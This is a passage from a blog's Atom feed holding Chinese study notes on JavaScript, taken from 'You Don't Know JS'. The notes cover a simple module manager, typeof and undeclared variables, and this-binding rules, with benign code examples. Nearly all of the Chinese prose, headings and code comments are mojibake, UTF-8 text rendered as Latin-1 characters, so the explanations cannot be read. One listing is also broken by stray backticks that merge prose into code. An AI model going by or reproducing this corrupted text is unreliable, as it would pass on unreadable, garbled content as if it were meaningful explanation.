è½½å™¨/æ¶ˆæ¯æœºåˆ¶å®è´¨ä¸Šéƒ½æ˜¯å°†è¿™ç§æ¨¡å—å®šä¹‰åŒ…è£…è¿›ä¸€ä¸ªå‹å¥½çš„APIã€‚ä¸å…¶æ£€è§†ä»»æ„ä¸€ä¸ªç‰¹å®šçš„åº“ï¼Œä¸å¦‚è®©æˆ‘ ï¼ˆä»…ï¼‰ä¸ºäº†è¯´æ˜çš„ç›®çš„ å±•ç¤ºä¸€ä¸ª éå¸¸ç®€å• çš„æ¦‚å¿µè¯æ˜ï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> MyModules = (<span class="function"><span class="keyword">function</span> <span class="title">Manager</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"><span class="keyword">var</span> modules = &#123;&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">define</span>(<span class="params">name, deps, impl</span>) </span>&#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> i=<span class="number">0</span>; i&lt;deps.length; i++) &#123;</span><br><span class="line">deps[i] = modules[deps[i]];</span><br><span class="line">&#125;</span><br><span class="line">modules[name] = impl.apply( impl, deps );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get</span>(<span class="params">name</span>) </span>&#123;</span><br><span class="line"><span class="keyword">return</span> modules[name];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> &#123;</span><br><span class="line">define: define,</span><br><span class="line">get: get</span><br><span class="line">&#125;;</span><br><span class="line">&#125;)();</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;å‚è€ƒæ¥æº&quot;&gt;&lt;a href=&quot;#å‚è€ƒæ¥æº&quot; class=&quot;headerlink&quot; title=&quot;å‚è€ƒæ¥æº&quot;&gt;&lt;/a&gt;å‚è€ƒæ¥æº&lt;/h2&gt;&lt;p&gt;æœ¬æ–‡æ˜¯you donâ€™t know jsç³»åˆ—çš„ &lt;a href=&quot;https://github.com/getify/You-Dont-Know-JS/tree/1ed-zh-CN/scope%20%26%20closures&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;ä½œç”¨åŸŸä¸é—­åŒ…&lt;/a&gt; ç¬”è®°&lt;/p&gt;
&lt;h2 id=&quot;ä¸€ã€ä½œç”¨åŸŸ&quot;&gt;&lt;a href=&quot;#ä¸€ã€ä½œç”¨åŸŸ&quot; class=&quot;headerlink&quot; title=&quot;ä¸€ã€ä½œç”¨åŸŸ&quot;&gt;&lt;/a&gt;ä¸€ã€ä½œç”¨åŸŸ&lt;/h2&gt;&lt;h3 id=&quot;ä»€ä¹ˆæ˜¯ä½œç”¨åŸŸ&quot;&gt;&lt;a href=&quot;#ä»€ä¹ˆæ˜¯ä½œç”¨åŸŸ&quot; class=&quot;headerlink&quot; title=&quot;ä»€ä¹ˆæ˜¯ä½œç”¨åŸŸ&quot;&gt;&lt;/a&gt;ä»€ä¹ˆæ˜¯ä½œç”¨åŸŸ&lt;/h3&gt;&lt;p&gt;å‡ ä¹æ‰€æœ‰è®¡ç®—æœºè¯­è¨€éƒ½æä¾›äº†æœ€åŸºç¡€çš„å˜é‡æ¨¡å‹ï¼Œå˜é‡å®ƒå…è®¸äººä»¬å°†å€¼å­˜å…¥å˜é‡ä¸­ï¼Œå¹¶ä¸”å†åç»­ä»å˜é‡ä¸­å–å€¼æˆ–ä¿®æ”¹å€¼ã€‚&lt;/p&gt;
&lt;p&gt;ä½†æ˜¯å˜é‡çš„å­˜å‚¨åŒæ ·ä¼šå¸¦æ¥å‡ ä¸ªé—®é¢˜ï¼Œæˆ‘ä»¬å¦‚ä½•å­˜å‚¨æ•°æ®åˆ°å˜é‡ä¸Šï¼Œåˆå¦‚ä½•æŸ¥æ‰¾å˜é‡çš„å€¼ã€‚è¿™æ ·çš„ä¸€äº›åˆ—è§„åˆ™æˆ‘ä»¬å°†å…¶ç§°ä¹‹ä¸ºä½œç”¨åŸŸ&lt;/p&gt;
&lt;p&gt;&lt;div&gt;
    
    </summary>
    
      <category term="js" scheme="http://zhoushaw.github.io/categories/js/"/>
    
    
      <category term="js" scheme="http://zhoushaw.github.io/tags/js/"/>
    
  </entry>
  
  <entry>
    <title>types &amp; grammar</title>
    <link href="http://zhoushaw.github.io/2019/04/01/learning/book-notes/types%20&amp;%20grammar/"/>
    <id>http://zhoushaw.github.io/2019/04/01/learning/book-notes/types &amp; grammar/</id>
    <published>2019-03-31T20:36:35.000Z</published>
    <updated>2019-04-20T12:39:57.662Z</updated>
    
    <content type="html"><![CDATA[<h2 id="ä¸€ã€ç±»å‹"><a href="#ä¸€ã€ç±»å‹" class="headerlink" title="ä¸€ã€ç±»å‹"></a>ä¸€ã€ç±»å‹</h2><blockquote><p>åŸºæœ¬ç±»å‹</p></blockquote><p>JavaScript å®šä¹‰äº†ä¸ƒç§å†…å»ºç±»å‹ï¼š</p><p>null<br>undefined<br>boolean<br>number<br>string<br>symbol â€“ åœ¨ ES6 ä¸­è¢«åŠ å…¥çš„ï¼<br>object</p><p><strong>æ³¨æ„</strong>ï¼š é™¤äº† object æ‰€æœ‰è¿™äº›ç±»å‹éƒ½è¢«ç§°ä¸ºâ€œåŸºæœ¬ç±»å‹ï¼ˆprimitivesï¼‰â€ã€‚</p><blockquote><p>ç±»å‹æ£€æµ‹</p></blockquote><p>typeof æ“ä½œç¬¦å¯ä»¥æ£€æµ‹ç»™å®šå€¼çš„ç±»å‹ï¼Œè€Œä¸”æ€»æ˜¯è¿”å›ä¸ƒç§å­—ç¬¦ä¸²å€¼ä¸­çš„ä¸€ç§</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">typeof undefined     === &quot;undefined&quot;; // true</span><br><span class="line">typeof true          === &quot;boolean&quot;;   // true</span><br><span class="line">typeof 42            === &quot;number&quot;;    // true</span><br><span class="line">typeof &quot;42&quot;          === &quot;string&quot;;    // true</span><br><span class="line">typeof &#123; life: 42 &#125;  === &quot;object&quot;;    // true</span><br><span class="line"></span><br><span class="line">// åœ¨ ES6 ä¸­è¢«åŠ å…¥çš„ï¼</span><br><span class="line">typeof Symbol()      === &quot;symbol&quot;;    // true</span><br></pre></td></tr></table></figure><p>åœ¨ä¸Šé¢çš„åˆ—è¡¨ä¸­å‰”é™¤äº† nullã€‚å®ƒæ˜¯ ç‰¹æ®Šçš„ â€“ ç‰¹æ®Šåœ¨å®ƒä¸ typeof æ“ä½œç¬¦ç»„åˆæ—¶æ˜¯æœ‰ bug çš„ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">typeof null === &quot;object&quot;; // true</span><br></pre></td></tr></table></figure><h3 id="undefined-vs-â€œundeclaredâ€"><a href="#undefined-vs-â€œundeclaredâ€" class="headerlink" title="undefined vs â€œundeclaredâ€"></a>undefined vs â€œundeclaredâ€</h3><p>å½“å‰ è¿˜ä¸æ‹¥æœ‰å€¼çš„å˜é‡ï¼Œå®é™…ä¸Šæ‹¥æœ‰ undefined å€¼ã€‚å¯¹è¿™æ ·çš„å˜é‡è°ƒç”¨ typeof å°†ä¼šè¿”å› <code>&quot;undefined&quot;</code>ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">var a;</span><br><span class="line"></span><br><span class="line">typeof a; // &quot;undefined&quot;</span><br><span class="line"></span><br><span class="line">var b = 42;</span><br><span class="line">var c;</span><br><span class="line"></span><br><span class="line">// ç¨å</span><br><span class="line">b = c;</span><br><span class="line"></span><br><span class="line">typeof b; // &quot;undefined&quot;</span><br><span class="line">typeof c; // &quot;undefined&quot;</span><br></pre></td></tr></table></figure><p>å¤§å¤šæ•°å¼€å‘è€…è€ƒè™‘â€œundefinedâ€è¿™ä¸ªè¯çš„æ–¹å¼ä¼šè¯±ä½¿ä»–ä»¬è®¤ä¸ºå®ƒæ˜¯â€œundeclaredï¼ˆæœªå£°æ˜ï¼‰â€çš„åŒä¹‰è¯ã€‚ç„¶è€Œåœ¨ JS ä¸­ï¼Œè¿™ä¸¤ä¸ªæ¦‚å¿µååˆ†ä¸åŒã€‚</p><p>ä¸€ä¸ªâ€œundefinedâ€å˜é‡æ˜¯åœ¨å¯è®¿é—®çš„ä½œç”¨åŸŸä¸­å·²ç»è¢«å£°æ˜è¿‡çš„ï¼Œä½†æ˜¯åœ¨ è¿™ä¸ªæ—¶åˆ» å®ƒé‡Œé¢æ²¡æœ‰ä»»ä½•å€¼ã€‚ç›¸æ¯”ä¹‹ä¸‹ï¼Œä¸€ä¸ªâ€œundeclaredâ€å˜é‡æ˜¯åœ¨å¯è®¿é—®çš„ä½œç”¨åŸŸä¸­è¿˜æ²¡æœ‰è¢«æ­£å¼å£°æ˜çš„ã€‚</p><blockquote><p>è€ƒè™‘è¿™æ®µä»£ç ï¼š</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">var a;</span><br><span class="line"></span><br><span class="line">a; // undefined</span><br><span class="line">b; // ReferenceError: b is not defined</span><br></pre></td></tr></table></figure><p>åœ¨ä¸Šé¢ä»£ç ä¸­ï¼Œbæœªå£°æ˜æ—¶è¿›è¡Œäº†ä½¿ç”¨ï¼Œæµè§ˆå™¨åé¦ˆçš„é”™è¯¯æ˜¯ï¼š<code>b is not defined</code>.è¿™å½“ç„¶å¾ˆå®¹æ˜“è€Œä¸”å¾ˆåˆç†åœ°ä½¿äººå°†å®ƒä¸â€œb is undefined.â€ææ··ã€‚éœ€è¦é‡ç”³çš„æ˜¯ï¼Œâ€œundefinedâ€å’Œâ€œis not definedâ€æ˜¯éå¸¸ä¸åŒçš„ä¸œè¥¿ã€‚è¦æ˜¯æµè§ˆå™¨èƒ½å‘Šè¯‰æˆ‘ä»¬ç±»ä¼¼äºâ€œb is not foundâ€æˆ–è€…â€œb is not declaredâ€ä¹‹ç±»çš„ä¸œè¥¿å°±å¥½äº†ï¼Œé‚£ä¼šå‡å°‘è¿™ç§å›°æƒ‘ï¼</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">var a;</span><br><span class="line"></span><br><span class="line">typeof a; // &quot;undefined&quot;</span><br><span class="line"></span><br><span class="line">typeof b; // &quot;undefined&quot;</span><br></pre></td></tr></table></figure><p><code>type</code> å¯¹äºæœªundeclaredçš„å˜é‡ï¼Œè¿”å›å€¼ä¹Ÿæ˜¯<code>undefined</code>ã€‚å³ä½¿ æ˜¯ä¸€ä¸ªæœªå£°æ˜å˜é‡ï¼Œä¹Ÿä¸ä¼šæœ‰é”™è¯¯è¢«æŠ›å‡ºã€‚è¿™æ˜¯ typeof çš„ä¸€ç§ç‰¹æ®Šçš„å®‰å…¨é˜²å«è¡Œä¸º</p><h3 id="typeof-Undeclared"><a href="#typeof-Undeclared" class="headerlink" title="typeof Undeclared"></a>typeof Undeclared</h3><p>ç”±äºtypeofå®‰å…¨é˜²å«çš„ç‰¹æ€§ï¼Œæˆ‘ä»¬å¯ä»¥å°†å…¶ç”¨æ¥åˆ¤æ–­ä¸€ä¸ªå˜é‡æ˜¯å¦åœ¨ä½œç”¨åŸŸå†…è¿›è¡Œäº†èµ‹å€¼æ“ä½œï¼Œå€˜è‹¥ä¸ä½¿ç”¨typeofï¼Œè‹¥å˜é‡ä¸å­˜åœ¨å°†ä¼šå‘ç”Ÿå¼‚å¸¸</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">if (typeof sss === &quot;undefined&quot;) &#123;</span><br><span class="line">sss = function() &#123; /*..*/ &#125;;</span><br><span class="line">&#125;</span><br><span class="line">``</span><br><span class="line"></span><br><span class="line">&gt; ä½¿ç”¨åœºæ™¯</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ä½œä¸ºä¸€ä¸ªç®€å•çš„ä¾‹å­ï¼Œæƒ³è±¡åœ¨ä½ çš„ç¨‹åºä¸­æœ‰ä¸€ä¸ªâ€œè°ƒè¯•æ¨¡å¼â€ï¼Œå®ƒæ˜¯é€šè¿‡ä¸€ä¸ªç§°ä¸º DEBUG çš„å…¨å±€å˜é‡ï¼ˆæ ‡å¿—ï¼‰æ¥æ§åˆ¶çš„ã€‚åœ¨å®æ–½ç±»ä¼¼äºåœ¨æ§åˆ¶å°ä¸Šè¾“å‡ºä¸€æ¡æ—¥å¿—æ¶ˆæ¯è¿™æ ·çš„è°ƒè¯•ä»»åŠ¡ä¹‹å‰ï¼Œä½ æƒ³è¦æ£€æŸ¥è¿™ä¸ªå˜é‡æ˜¯å¦è¢«å£°æ˜äº†ã€‚ä¸€ä¸ªé¡¶å±‚çš„å…¨å±€ var DEBUG = true å£°æ˜åªåŒ…å«åœ¨ä¸€ä¸ªâ€œdebug.jsâ€æ–‡ä»¶ä¸­ï¼Œè¿™ä¸ªæ–‡ä»¶ä»…åœ¨ä½ å¼€å‘/æµ‹è¯•æ—¶æ‰è¢«åŠ è½½åˆ°æµè§ˆå™¨ä¸­ï¼Œè€Œåœ¨ç”Ÿäº§ç¯å¢ƒä¸­åˆ™ä¸ä¼šã€‚</span><br><span class="line"></span><br><span class="line">ç„¶è€Œï¼Œåœ¨ä½ å…¶ä»–çš„ç¨‹åºä»£ç ä¸­ï¼Œä½ ä¸å¾—ä¸å°å¿ƒä½ æ˜¯å¦‚ä½•æ£€æŸ¥è¿™ä¸ªå…¨å±€çš„ DEBUG å˜é‡çš„ï¼Œè¿™æ ·ä½ æ‰ä¸ä¼šæŠ›å‡ºä¸€ä¸ª ReferenceErrorã€‚è¿™ç§æƒ…å†µä¸‹ typeof ä¸Šçš„å®‰å…¨é˜²å«å°±æ˜¯æˆ‘ä»¬çš„æœ‹å‹ã€‚</span><br></pre></td></tr></table></figure><p>// å™¢ï¼Œè¿™å°†æŠ›å‡ºä¸€ä¸ªé”™è¯¯ï¼<br>if (DEBUG) {<br>    console.log( â€œDebugging is startingâ€ );<br>}</p><p>// è¿™æ˜¯ä¸€ä¸ªå®‰å…¨çš„å­˜åœ¨æ€§æ£€æŸ¥<br>if (typeof DEBUG !== â€œundefinedâ€) {<br>    console.log( â€œDebugging is startingâ€ );<br>}<br><code>`</code></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;ä¸€ã€ç±»å‹&quot;&gt;&lt;a href=&quot;#ä¸€ã€ç±»å‹&quot; class=&quot;headerlink&quot; title=&quot;ä¸€ã€ç±»å‹&quot;&gt;&lt;/a&gt;ä¸€ã€ç±»å‹&lt;/h2&gt;&lt;blockquote&gt;
&lt;p&gt;åŸºæœ¬ç±»å‹&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;JavaScript å®šä¹‰äº†ä¸ƒç§å†…å»ºç±»å‹ï¼š&lt;/
      
    
    </summary>
    
      <category term="js" scheme="http://zhoushaw.github.io/categories/js/"/>
    
    
      <category term="js" scheme="http://zhoushaw.github.io/tags/js/"/>
    
  </entry>
  
  <entry>
    <title>this &amp; å¯¹è±¡åŸå‹</title>
    <link href="http://zhoushaw.github.io/2019/04/01/learning/book-notes/this&amp;%E5%AF%B9%E8%B1%A1%E5%8E%9F%E5%9E%8B/"/>
    <id>http://zhoushaw.github.io/2019/04/01/learning/book-notes/this&amp;å¯¹è±¡åŸå‹/</id>
    <published>2019-03-31T20:36:35.000Z</published>
    <updated>2019-04-23T13:22:02.323Z</updated>
    
    <content type="html"><![CDATA[<h2 id="ä¸€ã€thiså…³é”®è¯"><a href="#ä¸€ã€thiså…³é”®è¯" class="headerlink" title="ä¸€ã€thiså…³é”®è¯"></a>ä¸€ã€thiså…³é”®è¯</h2><p class="tip">thisæ˜¯å…³é”®è¯ï¼Œè¡¨ç¤ºæŒ‡å‘çš„ç´¢å¼•ä½ç½®</p><p>å¾ˆå¤šäººå¯¹äºthisæœ€ç»ˆæŒ‡å‘å¸¸è§çš„è¯¯è§£æ˜¯ï¼Œthisæ˜¯ç¼–å†™æ—¶ç»‘å®šçš„ï¼Œé€šå¸¸ä¼šå°†å…¶è®¤ä¸ºæˆä¸€ä¸‹å‡ ç§æƒ…å†µï¼š</p><p>1ã€è®¤ä¸ºthisæŒ‡å‘ï¼Œfooå‡½æ•°</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">foo</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="keyword">this</span>);</span><br><span class="line">&#125;</span><br><span class="line">foo();</span><br></pre></td></tr></table></figure><div><a id="more"></a></div><p>2ã€è®¤ä¸ºthisæŒ‡å‘ï¼Œobjå¯¹è±¡</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">foo</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"><span class="built_in">console</span>.log( <span class="keyword">this</span>.a );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> obj = &#123;</span><br><span class="line">a: <span class="number">2</span>,</span><br><span class="line">foo: foo</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> bar = obj.foo; <span class="comment">// å‡½æ•°å¼•ç”¨ï¼</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> a = <span class="string">"oops, global"</span>; <span class="comment">// `a` ä¹Ÿæ˜¯ä¸€ä¸ªå…¨å±€å¯¹è±¡çš„å±æ€§</span></span><br><span class="line"></span><br><span class="line">bar(); <span class="comment">// "oops, global"</span></span><br></pre></td></tr></table></figure><h3 id="å¯ä»¥å¤§è‡´åˆ†ä¸ºä»¥ä¸‹å‡ ç§æƒ…å†µï¼š"><a href="#å¯ä»¥å¤§è‡´åˆ†ä¸ºä»¥ä¸‹å‡ ç§æƒ…å†µï¼š" class="headerlink" title="å¯ä»¥å¤§è‡´åˆ†ä¸ºä»¥ä¸‹å‡ ç§æƒ…å†µï¼š"></a>å¯ä»¥å¤§è‡´åˆ†ä¸ºä»¥ä¸‹å‡ ç§æƒ…å†µï¼š</h3><p>å‡½æ•°è°ƒç”¨æ–¹å¼ä¸å†…éƒ¨thisæŒ‡é’ˆå…³ç³»<br>1.ç›´æ¥è°ƒç”¨:å‡½æ•°å†…éƒ¨thisæŒ‡å‘å…¨å±€å¯¹è±¡window<br>2.é€šè¿‡å¯¹è±¡ä½¿ç”¨ç‚¹æ¥è°ƒç”¨:å‡½æ•°å†…éƒ¨thisæŒ‡å‘è°ƒç”¨å¯¹è±¡<br>3.è§¦å‘äº‹ä»¶è°ƒç”¨å‡½æ•°:å‡½æ•°å†…éƒ¨çš„thisæŒ‡å‘è§¦å‘äº‹ä»¶çš„å¯¹è±¡<br>4.ä»¥newçš„æ–¹å¼æ¥è°ƒç”¨:å‡½æ•°å†…éƒ¨thisæŒ‡å‘æœ¬æ¬¡å‡½æ•°æ‰§è¡Œæ—¶å¯¹åº”çš„ä¸€ä¸ªåŒ¿åå¯¹è±¡ï¼ˆä»¥newçš„æ–¹å¼åˆ›å»ºçš„å‡½æ•°ï¼Œå‡½æ•°åçš„é¦–å­—æ¯ä¸€èˆ¬ä»¥å¤§å†™å­—æ¯å¼€å§‹ï¼‰<br>æ„é€ å‡½æ•° ï¼Œæ˜¯ä¸€ç§ç‰¹æ®Šçš„æ–¹æ³•ã€‚ä¸»è¦ç”¨æ¥åœ¨åˆ›å»ºå¯¹è±¡æ—¶åˆå§‹åŒ–å¯¹è±¡ï¼Œ å³ä¸ºå¯¹è±¡æˆå‘˜å˜é‡èµ‹åˆå§‹å€¼ï¼Œæ€»ä¸newè¿ç®—ç¬¦ä¸€èµ·ä½¿ç”¨åœ¨åˆ›å»ºå¯¹è±¡çš„è¯­å¥ä¸­ã€‚</p><p>5.é€šè¿‡callçš„æ–¹æ³•æ¥é—´æ¥è°ƒç”¨æ–¹æ³•:å‡½æ•°å†…éƒ¨thisæŒ‡å‘callæ–¹æ³•çš„ç¬¬ä¸€å‚æ•°å¯¹è±¡<br>æœ‰ç‚¹:æˆ‘ä»¬å¯ä»¥åˆ›å»ºç»“æ„ç›¸åŒï¼Œä½†å†…å®¹ä¸åŒçš„å¯¹è±¡</p><p>å¯å‚è€ƒ: <a href="http://www.ruanyifeng.com/blog/2018/06/javascript-this.html" target="_blank" rel="noopener">JavaScript çš„thisåŸç†</a></p><p>æŒ‰ç…§æœ¬æ–‡ä¸­çš„åˆ†ç±»å°†å…¶åˆ†ä¸ºå››å¤§å—ï¼š</p><p>é»˜è®¤ç»‘å®šã€éšå«ç»‘å®šã€æ˜ç¡®ç»‘å®šã€new ç»‘å®š</p><h3 id="ä»…ä»…æ˜¯è§„åˆ™"><a href="#ä»…ä»…æ˜¯è§„åˆ™" class="headerlink" title="ä»…ä»…æ˜¯è§„åˆ™"></a>ä»…ä»…æ˜¯è§„åˆ™</h3><p>thisçš„æœ€ç»ˆæŒ‡å‘å¯ä»¥å°†å…¶åˆ†ä¸ºå¤§è‡´å››ç§è§„åˆ™</p><h4 id="é»˜è®¤ç»‘å®š"><a href="#é»˜è®¤ç»‘å®š" class="headerlink" title="é»˜è®¤ç»‘å®š"></a>é»˜è®¤ç»‘å®š</h4><p>æˆ‘ä»¬è¦è€ƒå¯Ÿçš„ç¬¬ä¸€ç§è§„åˆ™æºäºå‡½æ•°è°ƒç”¨çš„æœ€å¸¸è§çš„æƒ…å†µï¼šç‹¬ç«‹å‡½æ•°è°ƒç”¨</p><p>åœ¨é<code>strict mode</code>æ¨¡å¼ä¸‹ï¼Œç‹¬ç«‹å‡½æ•°è°ƒç”¨é»˜è®¤æŒ‡å‘å…¨å±€å¯¹è±¡windowï¼Œåœ¨<code>strict mode</code>æ¨¡å¼ä¸‹é»˜è®¤ç»‘å®š æ¥è¯´å…¨å±€å¯¹è±¡æ˜¯ä¸åˆæ³•ï¼Œæ‰€ä»¥ <code>this</code> å°†è¢«è®¾ç½®ä¸º <code>undefined</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">function foo() &#123;</span><br><span class="line">console.log( this.a );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">var a = 2;</span><br><span class="line"></span><br><span class="line">foo(); // 2</span><br></pre></td></tr></table></figure><h4 id="éšå«ç»‘å®š"><a href="#éšå«ç»‘å®š" class="headerlink" title="éšå«ç»‘å®š"></a>éšå«ç»‘å®š</h4><p>å¦ä¸€ç§è¦è€ƒè™‘çš„è§„åˆ™æ˜¯ï¼šè°ƒç”¨ç‚¹æ˜¯å¦æœ‰ä¸€ä¸ªç¯å¢ƒå¯¹è±¡ï¼ˆ<code>context object</code>ï¼‰ï¼Œä¹Ÿç§°ä¸ºæ‹¥æœ‰è€…ï¼ˆ<code>owning</code>ï¼‰æˆ–å®¹å™¨ï¼ˆ<code>containing</code>ï¼‰å¯¹è±¡</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">function foo() &#123;</span><br><span class="line">console.log( this.a );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">var obj = &#123;</span><br><span class="line">a: 2,</span><br><span class="line">foo: foo</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">obj.foo(); // 2</span><br></pre></td></tr></table></figure><p class="tip">æ— è®º foo() æ˜¯å¦ä¸€å¼€å§‹å°±åœ¨ obj ä¸Šè¢«å£°æ˜ï¼Œè¿˜æ˜¯åæ¥ä½œä¸ºå¼•ç”¨æ·»åŠ ï¼ˆå¦‚ä¸Šé¢ä»£ç æ‰€ç¤ºï¼‰ï¼Œè¿™ä¸ª å‡½æ•° éƒ½ä¸è¢« obj æ‰€çœŸæ­£â€œæ‹¥æœ‰â€æˆ–â€œåŒ…å«â€.è°ƒç”¨ç‚¹ ä½¿ç”¨ obj ç¯å¢ƒæ¥ å¼•ç”¨ å‡½æ•°ï¼Œæ‰€ä»¥ä½  å¯ä»¥è¯´ obj å¯¹è±¡åœ¨å‡½æ•°è¢«è°ƒç”¨çš„æ—¶é—´ç‚¹ä¸Šâ€œæ‹¥æœ‰â€æˆ–â€œåŒ…å«â€è¿™ä¸ª å‡½æ•°å¼•ç”¨ã€‚</p><p>åªæœ‰å¯¹è±¡å±æ€§å¼•ç”¨é“¾çš„æœ€åä¸€å±‚æ˜¯å½±å“è°ƒç”¨ç‚¹çš„ã€‚æ¯”å¦‚ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">function foo() &#123;</span><br><span class="line">console.log( this.a );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">var obj2 = &#123;</span><br><span class="line">a: 42,</span><br><span class="line">foo: foo</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">var obj1 = &#123;</span><br><span class="line">a: 2,</span><br><span class="line">obj2: obj2</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">obj1.obj2.foo(); // 42</span><br></pre></td></tr></table></figure><h5 id="éšå«ä¸¢å¤±"><a href="#éšå«ä¸¢å¤±" class="headerlink" title="éšå«ä¸¢å¤±"></a>éšå«ä¸¢å¤±</h5><p>ä¼ é€’ä¸€ä¸ªå›è°ƒå‡½æ•°æ—¶ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">function foo() &#123;</span><br><span class="line">console.log( this.a );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function doFoo(fn) &#123;</span><br><span class="line">// `fn` åªä¸è¿‡ `foo` çš„å¦ä¸€ä¸ªå¼•ç”¨</span><br><span class="line"></span><br><span class="line">fn(); // &lt;-- è°ƒç”¨ç‚¹!</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">var obj = &#123;</span><br><span class="line">a: 2,</span><br><span class="line">foo: foo</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">var a = &quot;oops, global&quot;; // `a` ä¹Ÿæ˜¯ä¸€ä¸ªå…¨å±€å¯¹è±¡çš„å±æ€§</span><br><span class="line"></span><br><span class="line">doFoo( obj.foo ); // &quot;oops, global&quot;</span><br></pre></td></tr></table></figure><p>é‚£ä¹ˆå¦‚æœæ¥æ”¶ä½ æ‰€ä¼ é€’å›è°ƒçš„å‡½æ•°ä¸æ˜¯ä½ çš„ï¼Œè€Œæ˜¯è¯­è¨€å†…å»ºçš„å‘¢ï¼Ÿæ²¡æœ‰åŒºåˆ«ï¼ŒåŒæ ·çš„ç»“æœã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span 